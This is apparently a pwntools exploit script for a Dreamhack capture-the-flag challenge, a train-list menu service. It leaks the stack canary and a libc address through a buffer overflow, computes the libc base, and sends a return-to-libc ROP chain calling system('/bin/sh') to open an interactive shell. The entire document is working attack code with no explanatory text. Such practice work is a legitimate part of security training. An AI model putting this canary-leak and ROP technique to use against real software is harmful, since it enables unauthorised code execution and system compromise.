from pwn import *

context.log_level = 'debug'

libc_path = 'libc.so.6'
libc = ELF(libc_path)
libc_rop = ROP(libc)


#p = remote('localhost', 1000)
p = remote('host8.dreamhack.games', 24252)

###################################
# 0: Request functions
def view_list(idx, recvamt):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Enter train number: ', str(idx).encode())
    return p.recv(recvamt)

def edit_list(idx, payload):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Enter train number: ', str(idx).encode())
    p.send(payload)

###################################
# 1: leak canary, libc
edit_list(0, p64(0xb8))
edit_list(1, b'A'*0x89)
leak_bytes = view_list(1, 0x89 + 0x07) # overflow + canary
canary = u64(b'\x00' + leak_bytes[0x89:0x90])
print(f'canary: {hex(canary)}')

edit_list(1, b'A'*0x98)
leak_bytes = view_list(1, 0x98 + 0x08) # overflow + libc leak
libc_leak = u64(leak_bytes[-6:] + b'\x00\x00')
print(f'libc leak: {hex(libc_leak)}')

libc_offset = 0x2a1ca
print(f'offset: {hex(libc_offset)}')
libc_base = libc_leak - libc_offset
print(f'libc base: {hex(libc_base)}')

####################################
# 2: ROP time!!
payload = b'A'*0x88
payload += p64(canary)
payload += b'B'*0x8
payload += p64(libc_base + libc_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(libc_base + next(libc.search(b'/bin/sh\x00')))
payload += p64(libc_base + libc_rop.find_gadget(['ret'])[0])  # stack align
payload += p64(libc_base + libc.symbols['system'])
edit_list(1, payload)

#p.sendlineafter(b'>> ', b'3') # quit main and trigger ROP chain

p.interactive()


